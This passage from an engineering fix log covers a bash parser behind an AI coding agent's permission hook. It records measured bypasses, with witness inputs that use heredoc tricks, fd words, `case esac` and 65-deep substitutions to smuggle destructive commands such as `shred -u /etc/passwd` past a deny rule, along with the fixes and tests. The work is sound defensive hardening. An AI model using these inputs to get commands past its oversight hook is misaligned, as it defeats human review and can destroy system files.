`tasks/34_nul_byte_fail_open.md`'s. Round 5 only stops these two inputs from
reaching it. `test_a_raise_would_erase_the_decision_at_the_real_hook` pins the
PROCESS output — exit code and non-empty stdout — because that is the shape in
which a deny disappears.

### 12.6 The position axis, and the fd-word leaks it exposed (item 6)

The sweep is now a cross product of SLOT x SHAPE. The slot alphabet is
unchanged (every 1-3 character string over `<>&|;12-`, under the fd-word
prefixes `''`, `3`, `{v}` — 1752 slots). The shapes are new:

| shape | template |
|---|---|
| `argument` | `printf A <slot> TAIL` |
| `argument_conditional` | `printf A <slot> [[ ; TAIL ]]` |
| `command_start_semi` / `_and` / `_or` / `_pipe` / `_amp` | `printf A <sep> <slot> TAIL`, one per separator |
| `command_start_conditional` | `printf A ; <slot> [[ ; TAIL ]]` |
| `heredoc_body` | `cat <<EOF \n <slot> \n EOF \n TAIL` |
| `heredoc_dash_body` | `cat <<-EOF \n \t<slot> \n \tEOF \n TAIL` |
| `case_pattern` | `case a in <slot>) : ;; esac ; TAIL` |
| `case_esac_glued` | `case a in esac<slot> ; TAIL` |

12 shapes x 1752 slots = **21024** cases; bash executes the tail in **7771** of
them. `command_start_or` uses `false ||` rather than `printf A ||` because the
right side of `||` never runs after a successful left side, and a shape whose
tail bash never executes proves nothing —
`test_the_operator_space_sweep_is_not_vacuous` now asserts non-vacuity **per
shape**, so a new shape cannot join the corpus, execute nothing, and still be
counted as swept.

Closing it to 0 took three fixes beyond items 1-5, all in the same family — a
word bash consumes that the parser left in the stream, harmless as an argument
and fatal as a head:

```
printf A ; 3<<1 TAIL     round 4 -> ['printf A', '3 TAIL']     head `3`
printf A ; <&1 TAIL      round 4 -> ['printf A', '1 TAIL']     head `1`
printf A ; 3<&1 TAIL     round 4 -> ['printf A', '3 TAIL']     head `3`
```

1. **`n<<DELIM` drops its fd word.** The fd-prefix branch excluded the heredoc
   forms, so the fd digits flushed as a WORD. The delimiter is consumed by the
   heredoc branch; the fd word is now simply dropped, exactly as it already was
   for `3>`, `3<>` and `1>&`.
2. **The fd-dup OPERAND is dropped.** `<&` and `>&` sat only in
   `REDIRECTIONS_NO_ARG`, so their operand (`2`, `-`, `3`) leaked out as a
   word. A new table, `REDIRECTIONS_CONSUMING_A_WORD`, names what
   `_split_on_operators` must skip; `REDIRECTIONS_WITH_ARG` and
   `REDIRECTIONS_NO_ARG` keep their own meanings untouched.
3. **The leading fd word before `n>&m` is dropped.** The fd-prefix branch's
   `fd_op not in REDIRECTIONS_NO_ARG` exclusion is gone. The fused `2>&1` and
   `1>&2` still never enter the branch — the precondition
   `not _check_operator(command, i)` excludes them, and it is now the only
   exclusion.

This is the `n>&-` family §11.9 filed for its own task. It is closed here
because item 6's target is 0 and it was the residual, and because "direction
safe" was only ever true in argument position (see the round-5 correction in
§11.9). **Measured against bash rather than asserted**: a shell function named
`cmd` reports its own argument count on a duplicated fd 9, and bash gives it
ZERO arguments for every row of `_FD_DUP_FORMS_UNCHANGED` —
`test_fd_duplication_matches_what_bash_runs`. The old expectations
(`['cmd 2']`, `['cmd 3 1']`, `['cmd 2 -']`) were not a quirk to preserve; they
were wrong.

```
                  HEAD             round 4          round 5      bash runs
cmd >&2           ['cmd 2']        ['cmd 2']        ['cmd']      cmd, 0 args
cmd 3>&1          ['cmd 3 1']      ['cmd 3 1']      ['cmd']      cmd, 0 args
cmd 2>&-          ['cmd 2 -']      ['cmd 2 -']      ['cmd']      cmd, 0 args
cmd {v}>&2        ['cmd {v} 2']    ['cmd {v} 2']    ['cmd']      cmd, 0 args
```

The path-derived corpus gained the same axis in miniature: the `heredoc`,
`here_string` and `heredoc_dash` rows lost their `cat ` prefix (they were
testing the position after a command word, which the `word` row already
covers), two rows were added for a `<<-` body and a first-line terminator, and
the `known_gap` column is empty.

### 12.7 Verification

| | round 4 | round 5 |
|---|---|---|
| `tests/run_all_tests.py` | 1460 ran, OK, 1 skipped | **1477 ran, OK, 1 skipped** |
| `bash_command_parser.py` self-test | 107 / 0 | **107 / 0** |
| `test_integration_pretool.py` | 314 tests / 1268 subtests | **331 / 1377** |
| `TestTrapHandlerAgainstRealBash` | 240 cases, no exemption list | **6 tests / 275 subtests, 240 cases, still no exemption list** |
| `tests/scenario_check.py` | 1 pre-existing failure | **identical PASS/FAIL lines, diffed against the round-4 parser** |
| `TestAmpersandIsACommandSeparator` | 17 / 21, green | **17 / 21, green** (5 fd-dup rows re-measured, §12.6) |
| `TestSeparatorSuppressionTokens` | 40 methods | **41 methods / 261 subtests** |
| `TestReservedWordPositionIsDerivedFromTokens` | 13 / 458 | **13 / 479** (60 path rows, `known_gap` empty) |
| `TestBashOperatorTableIsBashs` | 14 / 158 | **14 / 170** (sweep 3504 -> 21024) |
| `TestHeredocAndCasePatternDoors` | — | **16 / 66** (new) |
| faithfulness, path corpus (240 cases) | 15 hidden | **0 hidden** |
| faithfulness, operator space (21024 cases) | 1946 hidden / 1836 laundered | **0 / 0** |
| real traffic (2107 distinct) | — | **0 verdict / 0 write-target changes, 4 split changes** |

Every corpus in that table **exists in the checkout and can be re-run by the
next reviewer** — that was the round-4 complaint and it is the reason the "801
cases" row is corrected rather than continued:

```
path corpus       tests/test_integration_pretool.py:_RESERVED_WORD_POSITION_PATHS
                  x _GROUND_TRUTH_PAYLOADS                        = 60 x 4 = 240
operator space    _operator_space_slots() x _OPERATOR_SPACE_SHAPES = 1752 x 12 = 21024
hand-written      TestSeparatorSuppressionTokens._BASH_GROUND_TRUTH        = 38
round-5 doors     _HEREDOC_AND_PATTERN_DOORS                               = 18
trap corpus       _TRAP_CORPUS_SIZE                                        = 240
```

**Faithfulness, three parsers, one corpus each.** The property is one-sided:
*bash never runs a command the parser did not report.*

```
                                     HEAD (ca2a81a)   round 4    round 5
path corpus, 240 cases                     70            15         0
operator space, 21024 cases (7771 run)   2079          1946         0
  ...of which laundered to `allow`         548          1836         0
```

> **Round-6 note on the laundering row.** The round-5 review could not
> reproduce `548` and measured `731` for HEAD. Both numbers are right; the row
> never said which permission set it used. Re-measured in round 6 on the same
> 21024-case corpus, executed-only:
>
> ```
>                                              HEAD    round 4   round 5/6
> _FakeLoader(printf, false, cat / deny shred)  548      1836        0
> the LIVE merged settings (allow=295 deny=9)   731      1836        0
> ```
>
> So round 4's factor over HEAD is **3.4x** under the fixture and **2.5x**
> under the live settings. The direction and the conclusion are unchanged; the
> row above is the fixture number and is reproducible with
> `_FakeLoader(["Bash(printf:*)","Bash(false:*)","Bash(cat:*)"],
> ["Bash(shred:*)"])` over `_operator_space_corpus()` with the tail replaced by
> `shred -u /tmp/x`. Stating the permission set is now part of the measurement.

Round 4's 15 on the path corpus break down as `fd_close` 3 (excluded by its own
`known_gap`), `heredoc` 3 and `heredoc_dash` 3 (hidden by the `cat ` prefix
those rows carried), `heredoc_dash_body` 3 and `heredoc_first_line` 3 (rows
that did not exist). Its 1946 on the operator space break down as
`heredoc_dash_body` 1752, `case_esac_glued` 84, and 110 across the five
command-start separators.

**Real-traffic differential.** 2107 distinct commands (3963 occurrences)
harvested from `~/.claude/bash_hook_debug.log` + its five rotated `.gz`
archives + `~/.claude/permission_requests.jsonl`, replayed under the real
`SettingsLoader` (asserted in the harness: `allow=295 deny=9 ask=0`), 0 parse
exceptions in every pass.

```
round 4 -> round 5:   verdict 0    split 4    write-target 0   (fewer sub-commands: 0)
HEAD    -> round 5:   verdict 0    split 9    write-target 0   (fewer sub-commands: 0)
HEAD    -> round 4:   verdict 0    split 5    write-target 0
```

**Direction of every one of the 4 changes**, named rather than counted:

1. *A heredoc no longer eats a word (§12.1) — NARROWING, 1 command.*
   ```
   D=$(cat /tmp/rev4dir); cd "$D"; python3 - <<'PY' > "$D/traffic.txt" …
      round 4: [… 'python3 - "$D/traffic.txt"' …]
      round 5: [… 'python3 -' …]
   ```
   Round 4's second skip consumed the `>` REDIRECT token, so `>`'s own target
   was never skipped and leaked in as an argument. bash passes `python3` one
   argument, `-`.

2. *The same fix, WIDENING, 2 commands.* Both are `cat > f <<'JS'` scripts
   whose body contains a line beginning `JSON.parse(m);` at column 0. The
   terminator test is a PREFIX match, so `JS` matches that line and the heredoc
   closes early in BOTH parsers; round 4 then silently dropped the leftover
   `ON.parse(m);` as the heredoc's operand, round 5 keeps it as an argument of
   `cat`. The sub-command COUNT is unchanged and the extra word can only make
   an allow pattern match less, never more. This is a real-traffic instance of
   the prefix-match residual recorded in §12.9.

3. *A stray fd word is gone (§12.6) — NARROWING, 1 command.*
   ```
   pnpm exec nx typecheck frontend-react 2>&1 | grep -E "…"
      round 4: [… 'pnpm exec nx typecheck frontend-react 2']
      round 5: [… 'pnpm exec nx typecheck frontend-react']
   ```

Narrowing can in principle let a command match a tighter allow pattern, so it
is stated plainly rather than filed under "no change": **measured, the verdict
moved on none of them, and no command anywhere in the corpus lost a
sub-command.** The 5 extra HEAD -> round-5 changes are round 4's own, already
documented in §11.9.

**Blast radius, re-probed consumer by consumer under the LIVE merged settings**
(`allow=295 deny=9`, module resolution asserted so the probe cannot silently
fall back to a different parser):

```
                                                       HEAD      round 4   round 5
<<EOF shred git status                                 allow     allow     deny
echo hi ; <<-1 shred git status                        deny      allow     deny
cat <<-EOF/\thello/\tEOF/shred git status              deny      allow     deny
cat <<E/E/shred git status                             allow     allow     deny
cat <<'a b'/a b/shred git status                       allow     allow     deny
case a in esac<<<x ; shred -u /etc/passwd              deny      allow     deny
case a in esac<x ; shred -u /etc/passwd                allow     allow     deny
("1"*4301) + ">& f\nshred -u /etc/passwd"              deny      NO OUTPUT deny
("$((" * 3000) + "\nshred -u /etc/passwd"              NO OUTPUT NO OUTPUT ask
("$(" * 3000) + "\nshred -u /etc/passwd"               NO OUTPUT NO OUTPUT ask
echo hi ; 1>&- shred -u /etc/passwd                    ask       ask       deny
shred -u /etc/passwd                                   deny      deny      deny
```

Run through `.claude/hooks/pretool_hook.py` as a PROCESS with a real hook
payload on stdin — not `--dry-run`, not the validator in-process — because
"exit 0 with empty stdout" is invisible to every other harness.

Identical through `permissions_mcp_lib._build_validator()` (`allow=295 deny=9`,
parser module resolution asserted): all ten decidable rows answer `deny`.
`.claude/hooks/telegram_permission_router.py` builds its validator inline from
the same two modules and so inherits identically; `tests/scenario_check.py`
PASS/FAIL lines are diff-identical to the round-4 parser's.

### 12.8 Mutation matrix — 17 mutations, 17 caught

**Numbering is round-qualified**, because §10.8's M15-M23 and §11.9's M15-M23
are different mutations and the collision made both tables unreadable. Read
round 3's as **R3-M1 .. R3-M23** (§10.8), round 4's as **R4-M1 .. R4-M16**
(§11.9's table, in order: R4-M1 = its M15 through R4-M16 = its M30), and this
round's as **R5-M1 .. R5-M14**.

Each mutation is applied to a `/tmp` copy of `.claude/hooks` + `tests` (`cp`
into a `mkdtemp`, never the repo) and scored against the whole of
`test_integration_pretool.py`. The copy has **1** baseline failure of its own —
`test_dot_alias_does_not_over_match_relative_path`, a workspace-path artifact of
running outside the checkout — subtracted from every row; it passes in the repo.

| | mutation | caught by |
|---|---|---|
| R5-M1 | restore `<<` / `<<-` in `REDIRECTIONS_WITH_ARG` (§12.1) | 5 |
| R5-M2 | `<<-` recognized but its tab strip never applied (§12.2) | 7 |
| R5-M3 | drop the FIRST-body-line terminator test (§12.3a) | 6 |
| R5-M4 | quoted delimiter scanned with the UNQUOTED rule (§12.3b) | 3 |
| R5-M5 | re-add the `<<<` guard on the heredoc branch (= R4-M16 / round 4's M30) | 1 |
| R5-M6 | drop the `esac` flush at the operator scan (§12.4) | 4 |
| R5-M7 | restore `int()` on the fd prefix (§12.5) | 4 |
| R5-M8 | remove the recursion cap (§12.5) | 3 |
| R5-M9 | `n<<DELIM` leaks its fd word again (§12.6) | 3 |
| R5-M10 | the fd-dup OPERAND word leaks again (§12.6) | 5 |
| R5-M11 | the leading fd word leaks again before `n>&m` (§12.6) | 5 |
| R5-M12 | heredoc terminator matched anywhere on the line, not at its start | 1 |
| R5-M13 | **TEST** mutation: sweep restricted to ARGUMENT position (round 4's corpus) | 1 |
| R5-M14 | **TEST** mutation: sweep drops the heredoc-body shapes | 1 |
| R3-M20 | REGRESSION CHECK: operator table scanned shortest-first | 21 |
| R3-M27 | REGRESSION CHECK: a REDIRECT reopens reserved-word position | 11 |
| R3-M28 | REGRESSION CHECK: revert `(` from `CMD_POSITION_WORDS` | 7 |

**R5-M13 and R5-M14 mutate the TESTS, not the parser**, and they are the point
of this round's method: deleting the command-start shape, or the heredoc-body
shapes, from the sweep must FAIL. Both die on
`test_the_operator_space_sweep_is_not_vacuous`, which asserts the corpus size
and non-vacuity **per shape**. Round 4's corpus could be reduced to one position
without any test noticing, which is how "0 hidden" was reported while 1946 were.

**R5-M5 SURVIVED the first pass, at 0 caught — the same result round 4
reported for it, arrived at for a different reason.** Round 4's 0 was wrong:
the guard was live, and `case a in esac<<<x ; shred -u /etc/passwd` was an
`allow` where HEAD denied. Round 5's 0 was *nearly* right: §12.4 fixes the hole
twice over — the guard is deleted AND an `esac` buffered in pattern mode is
flushed at the operator scan — so re-adding the guard alone no longer changes
that command. The guard is nevertheless still OBSERVABLE, on the 8-character
input the round-4 review named:

```
[[<<< ]]      with the guard:  ['[[']          without it:  ['[[ <<< ]]']
```

bash rejects that string ("unexpected token `<<<' in conditional command"), so
neither parse is a bypass — but *"no test can distinguish the guard's
presence"* is precisely the sentence that let round 4 keep it with a live
bypass behind it, and an UNPINNED redundancy decays back into that sentence.
`test_the_here_string_guard_was_a_live_bypass` now asserts both, and R5-M5 dies
on it. **An unobservable branch and an untested one still look identical; the
difference is still whether you measured.**

### 12.9 Found and RECORDED, not fixed — each deserves its own task

None of these is in round 5's scope. Each was measured on the round-5 parser
under the live merged settings (`allow=295 deny=9`) and is written down so the
next round starts from a list rather than from a search.

1. **`SCAFFOLDING_KEYWORDS` reduces a whole sub-command to `''`, which
   auto-allows** — `pretool_hook.py`, the `head in SCAFFOLDING_KEYWORDS` branch.
   The head token alone decides; nothing checks the tail.

   ```
   fi shred -u /etc/passwd      -> allow      (also `done …`, `esac …`, `for …`)
   ```

   Latent only because bash rejects those strings, so nothing executes. It is
   still an **unconditional head-token allow with no tail check**, one keyword
   away from a real command, and it is a different mechanism from everything
   task 32 has closed — the parser reports the sub-command correctly and the
   VALIDATOR throws it away.

2. **A quoted or escaped command WORD is never unquoted.** bash strips the
   quoting before it resolves the command name; the parser does not.

   ```
   'shred' git status    -> ask      bash runs `shred`
   s""hred git status    -> ask      bash runs `shred`
   \shred git status     -> ask      bash runs `shred`
   ```

   Deny -> ask only (the quoted head matches no pattern in either direction),
   so it costs a prompt and never an allow — but it is the same *"bash sees a
   command the parser does not"* class, on a surface no sweep here touches.

3. **`FUSED_FD_OPERATORS` is not word-boundary gated.**

   ```
   ./scripts/build2>&1 --all   -> allow, parsed as `./scripts/build --all`
   bash runs `./scripts/build2`
   ```

   This one is toward **allow**: an allowlisted `./scripts/build` launders a
   DIFFERENT binary whose name ends in a digit. The fd-prefix branch already
   has the right rule (`not current and not word_open`); the fused spellings
   are matched by `_check_operator` before it and inherit no such gate.

4. **The heredoc terminator is a PREFIX match, not an exact-line match.** A
   body line beginning with the delimiter ends the body early:

   ```
   cat > f <<'JS'
   …
   JSON.parse(m);        <- matches the delimiter `JS`, body ends here
   ```

   Found in real traffic (§12.7, change 2). The direction is safe — the parser
   surfaces body text as commands where bash surfaces none, so it over-reports
   and costs a prompt — and making it exact would move the parser toward
   swallowing MORE, which is the direction that needs its own justification and
   its own tests. Recorded, deliberately not changed here.

   > **CORRECTED IN ROUND 6 — this judgment was wrong, and it was a BLOCKER.**
   > The prefix match does not merely over-report. The residual of the line
   > that falsely closed the body is TOKENIZED, and it can reopen a swallowing
   > state — a fresh heredoc or an unterminated quote — that eats the real
   > terminator and every command after it. Measured over
   > {3 delimiters} x {18 residuals} x {`<<`,`<<-`}: **24 rows where HEAD does
   > not allow and round 5 does, and bash executes the payload in 24/24.**
   > Minimal witness `cat <<EOF\nEOF cat <<Z\nEOF\nshred -u /etc/passwd`:
   > HEAD `deny`, round 5 `allow ['cat cat']`. The reversal is not "the
   > direction was arguable"; it is that the argument was **measured false**.
   > Round 6 makes the TOKENIZER's terminator an exact line — see §13.2. The
   > two SUBSTITUTION scanners keep the prefix match, because bash's own
   > `$(...)` extent scanner is prefix-matched even though its heredoc reader
   > is exact; that asymmetry is measured in §13.2 too.

5. **`{v}>& /etc/passwd` still reports a write target bash refuses** (round 4's
   residual, unchanged). Over-reporting a write; costs a prompt, never an
   allow.

### 12.10 Residual risk after round 5

- **Still not installed.** Unchanged, and still the largest exposure: every fix
  in §9 through §12 is live in the working tree only. `~/.claude/hooks/`
  carries none of them until someone re-runs `./install-claude-config.sh`.
  Operator action.
- **`main()` still fails OPEN.** Round 5 stops two inputs from raising; it does
  not change the blanket `except Exception: sys.exit(0)`. Any raise that is
  found next is still a silently erased decision. That is
  `tasks/34_nul_byte_fail_open.md`'s question and it is now cross-referenced
  from both the parser (`MAX_SUBSTITUTION_DEPTH`) and the test that pins the
  process output.
- **Past `MAX_SUBSTITUTION_DEPTH` (64) nested substitutions are not
  extracted.** The literal text stays glued to its enclosing WORD, so the
  sub-command head is an unmatchable `$((…` and the answer is `ask`. No command
  a human writes nests 64 deep; a crafted one costs a prompt.

  > **CORRECTED IN ROUND 6 — this was wrong, and it was the other BLOCKER.**
  > The head is not the glued text; it is the ALLOWLISTED WORD IN FRONT of the
  > substitution, so the answer was `allow`, not `ask`. Measured:
  > `echo A $($(… 65 deep … shred -u /etc/passwd …))` — HEAD `deny`, round 5
  > `allow ['echo A']`, bash runs the payload. Every carrier (`$(…)`,
  > `` `…` ``, `<(…)`, `$((…))`, and the write-target gate). Round 6 makes each
  > gate REPORT its refusal — see §13.1.
- **The five items of §12.9**, of which #3 **and #4** are toward `allow`
  (round-6 correction: #4 was measured to under-report and hide commands, not
  to over-report — see the note in §12.9).
- **`([[ … ]])` glued, with no space, still mis-splits** toward `ask` (§9.2).
  Unchanged.
- **The parser is still a hand-written tokenizer, not bash**, and the honest
  form of that sentence is now three rounds old. Round 3 said a new door would
  have to add a token type; round 4 refuted it. Round 4 said the next door
  would not be an operator because that axis was swept; round 5 refutes it —
  the next door WAS an operator (`<<-`), in that sweep's own alphabet, hidden
  because the sweep varied spelling and held POSITION fixed. What round 5 adds
  is a corpus that varies both, is 21024 cases, exists in the repo, and is
  non-vacuous per shape. **The claim that follows from it is narrow on
  purpose**: no 1-3 character operator spelling, under any of three fd-word
  prefixes, in any of twelve positions, hides a command from the parser. It is
  not a claim about the parser, and the next axis — quoting of the command word
  (§12.9 #2) — is already known to be unswept.
- Everything else in §8.9, §9.8, §10.10 and §11.10 stands unchanged.

## 13. Fix log (round 6 — fixer, after the round-5 review FAILED)

Round 5 closed a class and opened two doors of its own. Both are **regressions
round 5 introduced**, both turn a HEAD `deny` into an explicit **`allow`**, and
that is worse than every failure mode this task has replaced so far: a
RecursionError reaches `main()`'s blanket handler and exits 0 with no output,
which Claude Code reads as "the hook had nothing to say" and falls through to
the native permission prompt. An `allow` suppresses the prompt.

Round 6 fixes exactly those two and adds no other *intended* behaviour.
Everything the round-5 review certified independently — the faithfulness
corpora, the real traffic differential, the fail-open closures, the `n>&-`
re-measurement, the `case` narrowing, the operator table, the position axis —
is re-measured here and unchanged.

> **Corrected in round 7.** "Adds no other behaviour" was false as a
> generalization, and it is the sentence that let round 7's blocker ship. Round
> 6's exact-line terminator (§13.2) is correct, but it REMOVED a mask: HEAD's
> prefix match had been accidentally compensating for a pre-existing bug in
> `_parse_heredoc_delim`, which scanned an unquoted delimiter as
> `[A-Za-z0-9_]*`. With the mask gone, every NON-ALPHANUMERIC delimiter
> (`<<EOF-1`, `<<EOF.txt`, `<<'E'OF`, and a CRLF `<<EOF\r`) stopped closing its
> body and swallowed the rest of the script — HEAD `deny` → round 6 `allow`,
> 34 ASCII spellings. A change can add behaviour it did not intend by
> withdrawing an accident that was load-bearing. See §14.

### 13.1 BLOCKER 1 — `MAX_SUBSTITUTION_DEPTH` truncated in SILENCE

Round 5's own comment on the constant said:

> Past the cap the nested text stays glued to its enclosing WORD instead of
> being re-parsed, so the sub-command head becomes that unmatchable word and
> the decision fails toward `ask` — never toward allow.

**The head is not the glued text. It is the allowlisted word IN FRONT of the
substitution.** Measured, with `Bash(echo:*)` allowed and `Bash(shred:*)`
denied:

```
echo A $($($(… d deep …  shred -u /etc/passwd  …)))
  depth 64 -> deny   ['echo A', 'shred -u /etc/passwd']
  depth 65 -> ALLOW  ['echo A']                          <- the truncation
  HEAD     -> deny
  bash     -> runs the payload (verified with a shadowed `shred`)
```

The threshold is exact and every carrier reaches it — `$(…)`, `` `…` ``,
`<(…)`, `$((…))`, and the write-destination gate, which reported **no write
target at all** for `echo A $(… 65 deep … echo x > /etc/passwd …)` (HEAD `ask`,
round 5 `allow`).

**The fix: truncation reports itself.** Two class constants, and three gates
that now say what they refused instead of going quiet:

```
TRUNCATED_SUBSTITUTION_COMMAND = '__unparsed_nested_substitution__'
TRUNCATED_SUBSTITUTION_TARGET  = '$__unparsed_nested_substitution__'

parse_with_offsets    appends the command sentinel when it declines to recurse
                      — covers `$(…)`, `` `…` ``, `<(…)`
_scan_arith           forwards the same sentinel as a nested CMD_SUBST
                      — covers `$((…))`, whose depth grows inside the
                        TOKENIZER while parse_with_offsets is still at depth 0,
                        so the first gate never fires for it
_scan_write_targets   appends the target sentinel, an unresolvable path, so the
                      write-destination gate refuses to vouch for a redirect it
                      could not see
```

Both sentinels are **unmatchable by construction**, and that is asserted rather
than assumed (`test_the_sentinels_are_unmatchable`): the command spelling
carries no shell metacharacter, so nothing downstream can re-tokenize it into
something with a friendlier head; it is not an env-assignment prefix and not a
`SCAFFOLDING_KEYWORDS`/`SAFE_BUILTINS` token, so `_reduce_to_effective_command`
cannot peel it away into the "runs nothing → auto-allow" branch; it reaches the
pattern lookup and matches no `Bash(<binary>:*)` an operator would write. The
target spelling begins with `$`, which `_is_redirect_target_allowed` already
treats as an unresolved expansion.

The sentinel is emitted **only where something was actually refused** — a
nesting that bottoms out exactly at the cap still parses cleanly and costs no
prompt, so the cap stays 64 rather than becoming 63 in practice
(`test_nesting_that_bottoms_out_at_the_cap_still_parses_cleanly`). The test is
complete because the one carrier whose depth grows in the tokenizer forwards
its refusal *as* a `CMD_SUBST` token, which is visible at the same place.

Measured after, on the real hook path as a PROCESS:

```
                                         HEAD    round 5   round 6
echo A $(x65  shred -u /etc/passwd)      deny     ALLOW      ask
echo A <(x65  shred -u /etc/passwd)      deny     ALLOW      ask
echo A $((x65 $(shred -u …)))            deny     ALLOW      ask
echo A $(x65  echo x > /etc/passwd)      ask      ALLOW      ask
echo A $(x64  shred -u /etc/passwd)      deny     deny       deny
echo A $(x64  echo hi)   [benign]        allow    allow      allow
```

**The cost, stated plainly.** `deny` → `ask` is a downgrade, and benign nesting
deeper than the cap now costs a prompt where HEAD allowed it
(`echo A $(… 70 deep … echo hi …)`: HEAD `allow`, round 6 `ask`). Both are the
safe direction, both are only reachable past 64 levels of substitution, and
neither is reachable by a command a human writes. `ask` is also the honest
answer: the parser did not look, and says so.

**Why round 5's tests could not see it.** `_FAIL_OPEN_CRASH_INPUTS` nests
**3000** deep for every class. Measured by binary search on HEAD, the first
`RecursionError` is at depth **993** for `$(`/`<(` nesting and **497** for
`$((`. 3000 is above both, so every one of those rows lands where HEAD already
fails open and there is nothing to compare against. The regression band — where
HEAD parses to the bottom and round 5 does not — is 65 up to those limits, and
it was untested. Round 6 sweeps **65, 66, 100, 200, 300** across four carriers
plus the write-target shape (`_DEPTH_CAP_DOORS`, `_DEPTH_CAP_WRITE_DOORS`), and
`test_the_band_is_the_cap_and_not_the_frame_limit` proves the band is the cap
rather than the frame limit by re-running the same inputs through a subclass
whose cap is raised: same algorithm, no raise, payload reported.

> **Round 7, stated precisely.** Re-measured through the validator, the first
> `RecursionError` is at depth **993** for `$(`/`<(` here and **992** in the
> round-6 reviewer's harness — the raise point is stack-context sensitive by
> ±1, because the number of frames already on the stack when the parse starts
> differs between a unittest runner and a bare script. `$((` reproduces at
> **497** in both. The claim the figure supports — that the cap's band lies
> entirely BELOW where HEAD raises — does not depend on the digit, but the
> digit should not be quoted as exact.

### 13.2 BLOCKER 2 — a prefix terminator plus a first-body-line test hides a command

Round 5 added the first-body-line terminator test (its item 3, a real fix — it
closed `cat <<E\nE\n…`, the shortest legal heredoc) and left the comparison a
PREFIX match, with this reasoning in the code:

> That direction surfaces body text as commands — more sub-commands, never
> fewer — so it fails toward `ask`. The opposite error is the bypass, and it is
> the one this must not make.

**It makes exactly that error.** The residual of the line that falsely closed
the body is TOKENIZED, and it can reopen a swallowing state — a fresh heredoc,
or an unterminated quote — which eats the real terminator and every command
after it:

```
cat <<EOF
EOF cat <<Z          <- prefix-matches `EOF`, body ends, ` cat <<Z` is tokenized
EOF                  <- eaten as the body of the heredoc `Z` never terminates
shred -u /etc/passwd <- eaten with it

  HEAD  -> deny  ['cat', 'shred -u /etc/passwd']   (never tested the first
  round 4 -> deny                                   body line, so immune)
  round 5 -> ALLOW ['cat cat']
  bash  -> runs the payload
```

A targeted fuzz over {3 delimiters} × {18 residuals} × {`<<`, `<<-`} = 108
cases, of which bash executes the payload in **102**:

```
                         HEAD   round 5   round 6
hid a command bash ran    12       24        0
```

The 24 are the measured breaking set, pinned as
`_HEREDOC_PREFIX_TERMINATOR_TRIPLES` and appended to the standing
`_HEREDOC_AND_PATTERN_DOORS` corpus (18 → 42 rows) so the three tests over it
now cover them. The breaking residual families are ` cat <<Z`, ` <<Z`,
` echo 'x`, ` echo "x`, ` cat <<-Z` — anything that opens an unterminated
heredoc or quote. `EOF`/`E` break on all five and `Z9` on only two, because a
residual heredoc `<<Z` is itself prefix-closed by a `Z9` line: the same defect
one level down, and the reason the set is pinned as measured rather than as a
tidy product. The whole 108-cell grid is kept as a standing property test, so
the next round sweeps the space and not only its known-bad corner.

**The fix.** The TOKENIZER's terminator is now an exact line: after the
optional `<<-` tab strip, the delimiter must run to end-of-line or
end-of-input. The two round-5 changes are correct only together, and
`test_the_two_round_5_changes_are_safe_only_together` pins both halves.

**This reverses §12.9 #4.** Round 5 argued the prefix match over-reports toward
`ask` and that making it exact "would move the parser toward swallowing MORE".
The measurement says the opposite: it under-reports and hides commands. The
reversal is recorded in place in §12.9 rather than quietly applied.

**One thing round 5 had right, kept.** The two SUBSTITUTION scanners
(`_scan_paren_subst`, `_scan_backtick`) still use the prefix match. Round 6
first made them exact too, for symmetry, and measured the cost — so this is a
result, not a preference. bash's `$(...)` **extent** scanner and its heredoc
**reader** disagree, on bash 5.3.9, one variable per row,
`x=$(cat <<EOF / <body> / EOF / printf INNER / )`:

```
body line     the substitution ends at        the heredoc body
`EOF )`       the `)` ON THAT LINE            unterminated (bash warns)
`EOFY )`      the `)` ON THAT LINE            unterminated
`EOF)`        the `)` ON THAT LINE            unterminated
`XEOF )`      the final `)`                   `XEOF )`
` EOF )`      the final `)`                   ` EOF )`
```

So bash finds the closing paren with a **prefix-matched** terminator and then
READS the heredoc with an exact-line one. Making our scanners exact diverges
from that, and it costs: `printf A $(cat <<EOF\nEOF )\nEOF\nprintf T\n) ;
printf Z` then **hid the `EOF` that bash really runs**, which round 5 did not.
The asymmetry is now documented at all three call sites and pinned by
`test_the_substitution_scanners_keep_bashs_prefix_extent_rule`, so it cannot be
"unified" in either direction without a test firing.

> **Corrected in round 7 — the grid's "0 hidden" holds only for ALPHANUMERIC
> delimiters.** The 108-cell grid below varies the residual 18 ways and the
> operator 2 ways and holds the DELIMITER at `EOF`, `E`, `Z9`. Re-run as a
> product with 10 non-alnum spellings (468 cells, 450 executed) round 6 hides
> **348**, and on a CRLF corpus (30 cells) it hides **all 30**. The exact-line
> rule is not what is wrong — the delimiter SCANNER is. Round 7 fixes the
> scanner and the same 468 + 30 cells read **0 hidden**; the grid now carries
> the delimiter as an axis so the claim travels. See §14.

### 13.3 Documentation corrected — five false statements

Each of these would have told the next reviewer not to look. They are corrected
where they stand, and the reversals are marked as reversals.

| where | said | measured |
|---|---|---|
| `bash_command_parser.py`, `MAX_SUBSTITUTION_DEPTH` | "the sub-command head becomes that unmatchable word and the decision fails toward `ask` — never toward allow" | the head is the allowlisted word in front; the decision was `allow` (§13.1) |
| `bash_command_parser.py`, tokenizer `closes_heredoc` | "more sub-commands, never fewer — so it fails toward `ask`. The opposite error is the bypass, and it is the one this must not make" | it makes exactly that error, 24 rows (§13.2) |
| §12.9 #4 | "The direction is safe — it over-reports and costs a prompt" | it under-reports and hides commands |
| §12.10, third bullet | "the sub-command head is an unmatchable `$((…` and the answer is `ask` … a crafted one costs a prompt" | the answer was `allow` |
| §12.10, fifth bullet | "#3 is the only one toward `allow`" | #4 was also toward `allow` |

**And one figure that was right but under-specified.** §12.7's HEAD laundering
count of `548` could not be reproduced by the reviewer, who measured `731`.
Both are correct; the row never said which permission set it used. Re-measured
in round 6 over the same 21024-case corpus, executed-only:

```
                                                HEAD    round 4   round 5/6
_FakeLoader(printf, false, cat / deny shred)     548      1836        0
the LIVE merged settings (allow=295 deny=9)      731      1836        0
```

Round 4's factor over HEAD is therefore **3.4×** under the fixture and **2.5×**
under the live settings. The direction and the conclusion stand; the bare
number does not travel without its permission set, and §12.7 now says so.

### 13.4 Verification

| | round 5 | round 6 |
|---|---|---|
| `tests/run_all_tests.py` | 1477 ran, OK, 1 skipped | **1494 ran, OK, 1 skipped** |
| `bash_command_parser.py` self-test | 107 / 0 | **107 / 0** |
| `test_integration_pretool.py` | 331 tests / 1377 subtests | **348 / 1668** |
| `TestHeredocAndCasePatternDoors` | 16 / 66 | **16 / 138** (corpus 18 → 42 rows) |
